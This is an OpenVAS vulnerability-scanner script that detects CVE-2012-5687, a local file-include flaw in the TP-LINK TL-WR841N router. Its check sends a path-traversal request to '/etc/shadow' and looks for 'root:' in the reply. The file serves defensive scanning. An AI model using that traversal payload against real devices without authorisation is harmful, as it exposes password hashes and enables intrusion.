###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tp_link_tl_wr841n.nasl 6697 2017-07-12 11:40:05Z cfischer $
#
# TP-LINK TL-WR841N Router Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "TP-LINK TL-WR841N router is prone to a local file-include
vulnerability because it fails to sufficiently sanitize user-
supplied input.

An attacker can exploit this vulnerability to view files and execute
local scripts in the context of the affected device. This may aid in
further attacks.

TP-LINK TL-WR841N 3.13.9 Build 120201 Rel.54965n is vulnerable; other
versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103600";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56320);
 script_cve_id("CVE-2012-5687");
 script_version ("$Revision: 6697 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_name("TP-LINK TL-WR841N Router Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56320");

 script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2012-10-30 11:42:36 +0100 (Tue, 30 Oct 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("WR841N/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("WR841N" >!< banner)exit(0);

url = '/help/../../../../../../../../../../../../../../../../../../etc/shadow'; 

if(http_vuln_check(port:port, url:url,pattern:"root:")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
